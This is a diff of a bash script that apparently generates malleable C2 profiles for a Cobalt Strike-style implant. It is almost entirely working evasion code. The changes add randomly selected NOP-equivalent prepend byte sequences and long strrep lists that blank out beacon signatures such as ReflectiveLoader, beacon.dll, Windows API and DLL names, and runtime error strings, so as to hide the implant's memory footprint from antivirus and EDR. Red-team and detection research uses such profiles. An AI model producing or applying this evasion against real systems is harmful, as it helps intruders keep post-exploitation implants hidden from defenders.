@@ -8,32 +8,38 @@ read -p "What is the jitter value (only numbers pls)?: " jitter
 read -p "Do you have certs? y/n: " tls
 
 
-#generate the prepend byte values for x64 and x86 payloads to obfuscate the magic bytes.
-prepend_bytes=("40" "41" "42" "6690" "40" "43" "44" "45" "46" "47" "48" "49" "4c" "90" "0f1f00" "660f1f0400" "0f1f0400" "0f1f00" "0f1f00" "87db" "87c9" "87d2" "6687db" "6687c9" "6687d2")
+x86_prepend_bytes=(
+	"\x66\x0f\x1f\x04\x00\x44\x48\x49\x66\x90\x66\x87\xd2\x87\xd2\x4c\x0f\x1f\x00\x47\x0f\x1f\x04\x00\x40\x0f\x1f\x00\x87\xdb\x42\x90\x40\x66\x87\xc9\x0f\x1f\x00\x43\x45\x41\x66\x87\xdb\x87\xc9\x46"
+	"\x87\xc9\x90\x44\x49\x87\xdb\x4c\x0f\x1f\x04\x00\x66\x90\x47\x48\x87\xd2\x66\x87\xc9\x66\x87\xd2\x66\x0f\x1f\x04\x00\x45\x66\x87\xdb\x40\x0f\x1f\x00\x0f\x1f\x00\x42\x40\x43\x46\x0f\x1f\x00\x41"
+	"\x43\x66\x87\xdb\x0f\x1f\x00\x44\x90\x46\x0f\x1f\x00\x66\x90\x42\x45\x48\x47\x66\x87\xc9\x87\xdb\x66\x87\xd2\x41\x66\x0f\x1f\x04\x00\x40\x0f\x1f\x04\x00\x87\xc9\x0f\x1f\x00\x49\x4c\x87\xd2\x40"
+	"\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x49\x45\x44\x87\xdb\x0f\x1f\x00\x4c\x43\x47\x40\x66\x87\xc9\x66\x87\xdb\x66\x90\x87\xc9\x0f\x1f\x04\x00\x42\x87\xd2\x40\x41\x46\x48\x90\x66\x87\xd2\x0f\x1f\x00"
+	"\x0f\x1f\x00\x66\x90\x66\x87\xdb\x44\x66\x87\xd2\x40\x43\x66\x87\xc9\x48\x0f\x1f\x00\x49\x42\x87\xc9\x47\x46\x87\xdb\x87\xd2\x90\x66\x0f\x1f\x04\x00\x0f\x1f\x04\x00\x0f\x1f\x00\x40\x41\x45\x4c"
+	"\x41\x87\xdb\x40\x44\x0f\x1f\x04\x00\x48\x66\x87\xd2\x90\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x47\x45\x66\x87\xc9\x66\x90\x87\xc9\x43\x0f\x1f\x00\x49\x87\xd2\x0f\x1f\x00\x66\x87\xdb\x46\x40\x4c\x42"
+	"\x47\x66\x87\xd2\x66\x0f\x1f\x04\x00\x40\x4c\x66\x87\xc9\x46\x87\xdb\x45\x41\x43\x40\x48\x87\xc9\x44\x0f\x1f\x00\x90\x87\xd2\x0f\x1f\x00\x0f\x1f\x00\x42\x66\x90\x0f\x1f\x04\x00\x49\x66\x87\xdb"
+	"\x44\x87\xd2\x0f\x1f\x04\x00\x42\x46\x87\xdb\x47\x48\x4c\x66\x87\xc9\x66\x87\xd2\x0f\x1f\x00\x66\x90\x43\x40\x45\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x87\xc9\x66\x87\xdb\x0f\x1f\x00\x40\x41\x49\x90"
+	"\x48\x43\x40\x87\xd2\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x66\x87\xc9\x49\x4c\x87\xdb\x90\x66\x87\xdb\x44\x66\x87\xd2\x66\x90\x0f\x1f\x00\x41\x45\x0f\x1f\x00\x46\x40\x0f\x1f\x04\x00\x42\x87\xc9\x47"
+	"\x48\x43\x90\x0f\x1f\x00\x66\x87\xc9\x40\x49\x47\x44\x66\x87\xd2\x66\x90\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x4c\x87\xc9\x66\x0f\x1f\x04\x00\x87\xd2\x0f\x1f\x00\x46\x40\x87\xdb\x41\x42\x66\x87\xdb"
+	)
+selected_x86_prepend=${x86_prepend_bytes[ $RANDOM % ${#x86_prepend_bytes[@]} ]}
 
-split_into_chunks() {
-    local value=$1
-    while [ -n "$value" ]; do
-        echo -n "${value:0:2} "
-        value=${value:2}
-    done
-}
+x64_prepend_bytes=(
+	"\x66\x0f\x1f\x04\x00\x44\x48\x49\x66\x90\x66\x87\xd2\x87\xd2\x4c\x0f\x1f\x00\x47\x0f\x1f\x04\x00\x40\x0f\x1f\x00\x87\xdb\x42\x90\x40\x66\x87\xc9\x0f\x1f\x00\x43\x45\x41\x66\x87\xdb\x87\xc9\x46"
+	"\x87\xc9\x90\x44\x49\x87\xdb\x4c\x0f\x1f\x04\x00\x66\x90\x47\x48\x87\xd2\x66\x87\xc9\x66\x87\xd2\x66\x0f\x1f\x04\x00\x45\x66\x87\xdb\x40\x0f\x1f\x00\x0f\x1f\x00\x42\x40\x43\x46\x0f\x1f\x00\x41"
+	"\x43\x66\x87\xdb\x0f\x1f\x00\x44\x90\x46\x0f\x1f\x00\x66\x90\x42\x45\x48\x47\x66\x87\xc9\x87\xdb\x66\x87\xd2\x41\x66\x0f\x1f\x04\x00\x40\x0f\x1f\x04\x00\x87\xc9\x0f\x1f\x00\x49\x4c\x87\xd2\x40"
+	"\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x49\x45\x44\x87\xdb\x0f\x1f\x00\x4c\x43\x47\x40\x66\x87\xc9\x66\x87\xdb\x66\x90\x87\xc9\x0f\x1f\x04\x00\x42\x87\xd2\x40\x41\x46\x48\x90\x66\x87\xd2\x0f\x1f\x00"
+	"\x0f\x1f\x00\x66\x90\x66\x87\xdb\x44\x66\x87\xd2\x40\x43\x66\x87\xc9\x48\x0f\x1f\x00\x49\x42\x87\xc9\x47\x46\x87\xdb\x87\xd2\x90\x66\x0f\x1f\x04\x00\x0f\x1f\x04\x00\x0f\x1f\x00\x40\x41\x45\x4c"
+	"\x41\x87\xdb\x40\x44\x0f\x1f\x04\x00\x48\x66\x87\xd2\x90\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x47\x45\x66\x87\xc9\x66\x90\x87\xc9\x43\x0f\x1f\x00\x49\x87\xd2\x0f\x1f\x00\x66\x87\xdb\x46\x40\x4c\x42"
+	"\x47\x66\x87\xd2\x66\x0f\x1f\x04\x00\x40\x4c\x66\x87\xc9\x46\x87\xdb\x45\x41\x43\x40\x48\x87\xc9\x44\x0f\x1f\x00\x90\x87\xd2\x0f\x1f\x00\x0f\x1f\x00\x42\x66\x90\x0f\x1f\x04\x00\x49\x66\x87\xdb"
+	"\x44\x87\xd2\x0f\x1f\x04\x00\x42\x46\x87\xdb\x47\x48\x4c\x66\x87\xc9\x66\x87\xd2\x0f\x1f\x00\x66\x90\x43\x40\x45\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x87\xc9\x66\x87\xdb\x0f\x1f\x00\x40\x41\x49\x90"
+	"\x48\x43\x40\x87\xd2\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x66\x87\xc9\x49\x4c\x87\xdb\x90\x66\x87\xdb\x44\x66\x87\xd2\x66\x90\x0f\x1f\x00\x41\x45\x0f\x1f\x00\x46\x40\x0f\x1f\x04\x00\x42\x87\xc9\x47"
+	"\x48\x43\x90\x0f\x1f\x00\x66\x87\xc9\x40\x49\x47\x44\x66\x87\xd2\x66\x90\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x4c\x87\xc9\x66\x0f\x1f\x04\x00\x87\xd2\x0f\x1f\x00\x46\x40\x87\xdb\x41\x42\x66\x87\xdb"
+	"\x49\x0f\x1f\x00\x47\x66\x87\xdb\x87\xd2\x41\x45\x0f\x1f\x00\x42\x40\x66\x87\xd2\x46\x87\xdb\x66\x87\xc9\x66\x90\x66\x0f\x1f\x04\x00\x0f\x1f\x04\x00\x87\xc9\x48\x0f\x1f\x00\x4c\x40\x44\x90\x43"
+	"\x87\xd2\x66\x87\xd2\x46\x42\x45\x66\x87\xc9\x44\x90\x66\x90\x0f\x1f\x00\x48\x40\x87\xdb\x0f\x1f\x00\x4c\x0f\x1f\x00\x0f\x1f\x04\x00\x41\x87\xc9\x66\x87\xdb\x43\x47\x40\x49\x66\x0f\x1f\x04\x00"
+	"\x44\x46\x4c\x0f\x1f\x04\x00\x66\x0f\x1f\x04\x00\x87\xdb\x41\x47\x40\x0f\x1f\x00\x49\x90\x42\x0f\x1f\x00\x87\xc9\x43\x40\x66\x90\x0f\x1f\x00\x66\x87\xd2\x87\xd2\x48\x45\x66\x87\xdb\x66\x87\xc9"
+	"\x40\x0f\x1f\x00\x66\x0f\x1f\x04\x00\x47\x48\x49\x66\x87\xdb\x46\x44\x40\x66\x87\xc9\x0f\x1f\x00\x87\xc9\x66\x87\xd2\x42\x87\xd2\x41\x0f\x1f\x04\x00\x66\x90\x0f\x1f\x00\x4c\x43\x45\x87\xdb\x90"
 
-processed_bytes=()
-for val in "${prepend_bytes[@]}"; do
-    if [ ${#val} -gt 2 ]; then
-        for chunk in $(split_into_chunks "$val"); do
-            processed_bytes+=("\\x$chunk")
-        done
-    else
-        processed_bytes+=("\\x$val")
-    fi
-done
-
-shuffled_bytes_x64=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
-shuffled_bytes_x642=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
-shuffled_bytes_x86=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
-shuffled_bytes_x862=$(printf "%s\n" "${processed_bytes[@]}" | sort -R | tr -d '\n')
+	)
+selected_x64_prepend=${x64_prepend_bytes[ $RANDOM % ${#x64_prepend_bytes[@]} ]}
 
 #-------------------------------------------------------------------------------------
 
@@ -720,70 +726,203 @@ echo "$selected_pe_clone" $'\n' >> $prof_name.profile
 echo " 
 	transform-x86 {
 		
-	    prepend \"$shuffled_bytes_x86$shuffled_bytes_x862\"; 
-	    strrep \"This program cannot be run in DOS mode\" \"\";
-	    strrep \"ReflectiveLoader\" \"\";
-	    strrep \"beacon.x64.dll\" \"\";
-	    strrep \"beacon.dll\" \"\";
-	    strrep \"msvcrt.dll\" \"\";
-	    strrep \"C:\\\\Windows\\\\System32\\\\msvcrt.dll\" \"\";
-	    strrep \"Stack around the variable\" \"\";
-	    strrep \"was corrupted.\" \"\";
-	    strrep \"The variable\" \"\";
-	    strrep \"is being used without being initialized.\" \"\";
-	    strrep \"The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared\" \"\";
-	    strrep \"A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:\" \"\";
-	    strrep \"Changing the code in this way will not affect the quality of the resulting optimized code.\" \"\";
-	    strrep \"Stack memory was corrupted\" \"\";
-	    strrep \"A local variable was used before it was initialized\" \"\";
-	    strrep \"Stack memory around _alloca was corrupted\" \"\";
-	    strrep \"Unknown Runtime Check Error\" \"\";
-	    strrep \"Unknown Filename\" \"\";
-	    strrep \"Unknown Module Name\" \"\";
-	    strrep \"Run-Time Check Failure\" \"\";
-	    strrep \"Stack corrupted near unknown variable\" \"\";
-	    strrep \"Stack pointer corruption\" \"\";
-	    strrep \"Cast to smaller type causing loss of data\" \"\";
-	    strrep \"Stack memory corruption\" \"\";
-	    strrep \"Local variable used before initialization\" \"\";
-	    strrep \"Stack around\" \"corrupted\";
-	    strrep \"operator\" \"\";
-	    strrep \"operator co_await\" \"\";
-	    strrep \"operator<=>\" \"\";
+	    prepend \"$selected_x86_prepend\"; 
+		strrep \"ReflectiveLoader\" \"\";
+		strrep \"This program cannot be run in DOS mode\" \"\";
+		strrep \"NtQueueApcThread\" \"\";
+		strrep \"Stack memory was corrupted\" \"\";
+		strrep \"beacon.dll\" \"\";
+		strrep \"ADVAPI32.dll\" \"\";
+		strrep \"WININET.dll\" \"\";
+		strrep \"WS2_32.dll\" \"\";
+		strrep \"DNSAPI.dll\" \"\";
+		strrep \"Secur32.dll\" \"\";
+		strrep \"VirtualProtectEx\" \"\";
+		strrep \"VirtualProtect\" \"\";
+		strrep \"VirtualAllocEx\" \"\";
+		strrep \"VirtualAlloc\" \"\";
+		strrep \"VirtualFree\" \"\";
+		strrep \"VirtualQuery\" \"\";
+		strrep \"RtlVirtualUnwind\" \"\";
+		strrep \"sAlloc\" \"\";
+		strrep \"FlsFree\" \"\";
+		strrep \"FlsGetValue\" \"\";
+		strrep \"FlsSetValue\" \"\";
+		strrep \"InitializeCriticalSectionEx\" \"\";
+		strrep \"CreateSemaphoreExW\" \"\";
+		strrep \"SetThreadStackGuarantee\" \"\";
+		strrep \"CreateThreadpoolTimer\" \"\";
+		strrep \"SetThreadpoolTimer\" \"\";
+		strrep \"WaitForThreadpoolTimerCallbacks\" \"\";
+		strrep \"CloseThreadpoolTimer\" \"\";
+		strrep \"CreateThreadpoolWait\" \"\";
+		strrep \"SetThreadpoolWait\" \"\";
+		strrep \"CloseThreadpoolWait\" \"\";
+		strrep \"FlushProcessWriteBuffers\" \"\";
+		strrep \"FreeLibraryWhenCallbackReturns\" \"\";
+		strrep \"GetCurrentProcessorNumber\" \"\";
+		strrep \"GetLogicalProcessorInformation\" \"\";
+		strrep \"CreateSymbolicLinkW\" \"\";
+		strrep \"SetDefaultDllDirectories\" \"\";
+		strrep \"EnumSystemLocalesEx\" \"\";
+		strrep \"CompareStringEx\" \"\";
+		strrep \"GetDateFormatEx\" \"\";
+		strrep \"GetLocaleInfoEx\" \"\";
+		strrep \"GetTimeFormatEx\" \"\";
+		strrep \"GetUserDefaultLocaleName\" \"\";
+		strrep \"IsValidLocaleName\" \"\";
+		strrep \"LCMapStringEx\" \"\";
+		strrep \"GetCurrentPackageId\" \"\";
+		strrep \"UNICODE\" \"\";
+		strrep \"UTF-8\" \"\";
+		strrep \"UTF-16LE\" \"\";
+		strrep \"MessageBoxW\" \"\";
+		strrep \"GetActiveWindow\" \"\";
+		strrep \"GetLastActivePopup\" \"\";
+		strrep \"GetUserObjectInformationW\" \"\";
+		strrep \"GetProcessWindowStation\" \"\";
+		strrep \"Sunday\" \"\";
+		strrep \"Monday\" \"\";
+		strrep \"Tuesday\" \"\";
+		strrep \"Wednesday\" \"\";
+		strrep \"Thursday\" \"\";
+		strrep \"Friday\" \"\";
+		strrep \"Saturday\" \"\";
+		strrep \"January\" \"\";
+		strrep \"February\" \"\";
+		strrep \"March\" \"\";
+		strrep \"April\" \"\";
+		strrep \"June\" \"\";
+		strrep \"July\" \"\";
+		strrep \"August\" \"\";
+		strrep \"September\" \"\";
+		strrep \"October\" \"\";
+		strrep \"November\" \"\";
+		strrep \"December\" \"\";
+		strrep \"MM/dd/yy\" \"\";
+		strrep \"Stack memory around _alloca was corrupted\" \"\";
+		strrep \"Unknown Runtime Check Error\" \"\";
+		strrep \"Unknown Filename\" \"\";
+		strrep \"Unknown Module Name\" \"\";
+		strrep \"Run-Time Check Failure #%d - %s\" \"\";
+		strrep \"Stack corrupted near unknown variable\" \"\";
+		strrep \"Stack pointer corruption\" \"\";
+		strrep \"Cast to smaller type causing loss of data\" \"\";
+		strrep \"Stack memory corruption\" \"\";
+		strrep \"Local variable used before initialization\" \"\";
+		strrep \"Stack around _alloca corrupted\" \"\";
+		strrep \"RegOpenKeyExW\" \"\";
+		strrep \"egQueryValueExW\" \"\";
+		strrep \"RegCloseKey\" \"\";
+		strrep \"LibTomMath\" \"\";
+		strrep \"Wow64DisableWow64FsRedirection\" \"\";
+		strrep \"Wow64RevertWow64FsRedirection\" \"\";
+		strrep \"Kerberos\" \"\";
+		strrep \"msvcrt.dll\" \"\";
+		strrep \"C:\\\\Windows\\\\System32\\\\msvcrt.dll\" \"\";
+		strrep \"Stack around the variable\" \"\";
+		strrep \"' was corrupted.\" \"\" ;
+		strrep \"The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention.\" \"\";
 	}" >> $prof_name.profile
 
 echo " 
 	transform-x64 {
-	    prepend \"$shuffled_bytes_x64$shuffled_bytes_x642\"; 
-	    strrep \"This program cannot be run in DOS mode\" \"\";
-	    strrep \"ReflectiveLoader\" \"\";
-	    strrep \"beacon.x64.dll\" \"\";
-	    strrep \"beacon.dll\" \"\";
-	    strrep \"msvcrt.dll\" \"\";
-	    strrep \"C:\\\\Windows\\\\System32\\\\msvcrt.dll\" \"\";
-	    strrep \"Stack around the variable\" \"\";
-	    strrep \"was corrupted.\" \"\";
-	    strrep \"The variable\" \"\";
-	    strrep \"is being used without being initialized.\" \"\";
-	    strrep \"The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared\" \"\";
-	    strrep \"A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:\" \"\";
-	    strrep \"Changing the code in this way will not affect the quality of the resulting optimized code.\" \"\";
-	    strrep \"Stack memory was corrupted\" \"\";
-	    strrep \"A local variable was used before it was initialized\" \"\";
-	    strrep \"Stack memory around _alloca was corrupted\" \"\";
-	    strrep \"Unknown Runtime Check Error\" \"\";
-	    strrep \"Unknown Filename\" \"\";
-	    strrep \"Unknown Module Name\" \"\";
-	    strrep \"Run-Time Check Failure\" \"\";
-	    strrep \"Stack corrupted near unknown variable\" \"\";
-	    strrep \"Stack pointer corruption\" \"\";
-	    strrep \"Cast to smaller type causing loss of data\" \"\";
-	    strrep \"Stack memory corruption\" \"\";
-	    strrep \"Local variable used before initialization\" \"\";
-	    strrep \"Stack around\" \"corrupted\";
-	    strrep \"operator\" \"\";
-	    strrep \"operator co_await\" \"\";
-	    strrep \"operator<=>\" \"\";
+	    prepend \"$selected_x64_prepend\"; 
+		strrep \"ReflectiveLoader\" \"\";
+		strrep \"This program cannot be run in DOS mode\" \"\";
+		strrep \"beacon.x64.dll\" \"\";
+		strrep \"NtQueueApcThread\" \"\";
+		strrep \"Stack memory was corrupted\" \"\";
+		strrep \"beacon.dll\" \"\";
+		strrep \"ADVAPI32.dll\" \"\";
+		strrep \"WININET.dll\" \"\";
+		strrep \"WS2_32.dll\" \"\";
+		strrep \"DNSAPI.dll\" \"\";
+		strrep \"Secur32.dll\" \"\";
+		strrep \"VirtualProtectEx\" \"\";
+		strrep \"VirtualProtect\" \"\";
+		strrep \"VirtualAllocEx\" \"\";
+		strrep \"VirtualAlloc\" \"\";
+		strrep \"VirtualFree\" \"\";
+		strrep \"VirtualQuery\" \"\";
+		strrep \"RtlVirtualUnwind\" \"\";
+		strrep \"sAlloc\" \"\";
+		strrep \"FlsFree\" \"\";
+		strrep \"FlsGetValue\" \"\";
+		strrep \"FlsSetValue\" \"\";
+		strrep \"InitializeCriticalSectionEx\" \"\";
+		strrep \"CreateSemaphoreExW\" \"\";
+		strrep \"SetThreadStackGuarantee\" \"\";
+		strrep \"CreateThreadpoolTimer\" \"\";
+		strrep \"SetThreadpoolTimer\" \"\";
+		strrep \"WaitForThreadpoolTimerCallbacks\" \"\";
+		strrep \"CloseThreadpoolTimer\" \"\";
+		strrep \"CreateThreadpoolWait\" \"\";
+		strrep \"SetThreadpoolWait\" \"\";
+		strrep \"FreeLibraryWhenCallbackReturns\" \"\";
+		strrep \"GetCurrentProcessorNumber\" \"\";
+		strrep \"GetLogicalProcessorInformation\" \"\";
+		strrep \"CreateSymbolicLinkW\" \"\";
+		strrep \"SetDefaultDllDirectories\" \"\";
+		strrep \"EnumSystemLocalesEx\" \"\";
+		strrep \"CompareStringEx\" \"\";
+		strrep \"GetDateFormatEx\" \"\";
+		strrep \"GetLocaleInfoEx\" \"\";
+		strrep \"GetTimeFormatEx\" \"\";
+		strrep \"GetUserDefaultLocaleName\" \"\";
+		strrep \"IsValidLocaleName\" \"\";
+		strrep \"LCMapStringEx\" \"\";
+		strrep \"GetCurrentPackageId\" \"\";
+		strrep \"UNICODE\" \"\";
+		strrep \"UTF-8\" \"\";
+		strrep \"UTF-16LE\" \"\";
+		strrep \"MessageBoxW\" \"\";
+		strrep \"GetActiveWindow\" \"\";
+		strrep \"GetLastActivePopup\" \"\";
+		strrep \"GetUserObjectInformationW\" \"\";
+		strrep \"GetProcessWindowStation\" \"\";
+		strrep \"Sunday\" \"\";
+		strrep \"Monday\" \"\";
+		strrep \"Tuesday\" \"\";
+		strrep \"Wednesday\" \"\";
+		strrep \"Thursday\" \"\";
+		strrep \"Friday\" \"\";
+		strrep \"Saturday\" \"\";
+		strrep \"January\" \"\";
+		strrep \"February\" \"\";
+		strrep \"March\" \"\";
+		strrep \"April\" \"\";
+		strrep \"June\" \"\";
+		strrep \"July\" \"\";
+		strrep \"August\" \"\";
+		strrep \"September\" \"\";
+		strrep \"October\" \"\";
+		strrep \"November\" \"\";
+		strrep \"December\" \"\";
+		strrep \"MM/dd/yy\" \"\";
+		strrep \"Stack memory around _alloca was corrupted\" \"\";
+		strrep \"Unknown Runtime Check Error\" \"\";
+		strrep \"Unknown Filename\" \"\";
+		strrep \"Unknown Module Name\" \"\";
+		strrep \"Run-Time Check Failure #%d - %s\" \"\";
+		strrep \"Stack corrupted near unknown variable\" \"\";
+		strrep \"Stack pointer corruption\" \"\";
+		strrep \"Cast to smaller type causing loss of data\" \"\";
+		strrep \"Stack memory corruption\" \"\";
+		strrep \"Local variable used before initialization\" \"\";
+		strrep \"Stack around _alloca corrupted\" \"\";
+		strrep \"RegOpenKeyExW\" \"\";
+		strrep \"egQueryValueExW\" \"\";
+		strrep \"RegCloseKey\" \"\";
+		strrep \"LibTomMath\" \"\";
+		strrep \"Wow64DisableWow64FsRedirection\" \"\";
+		strrep \"Wow64RevertWow64FsRedirection\" \"\";
+		strrep \"Kerberos\" \"\";
+		strrep \"msvcrt.dll\" \"\";
+		strrep \"C:\\\\Windows\\\\System32\\\\msvcrt.dll\" \"\";
+		strrep \"Stack around the variable\" \"\";
+		strrep \"' was corrupted.\" \"\" ;
+		strrep \"The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention.\" \"\";
 	}
 }" $'\n' >> $prof_name.profile
 
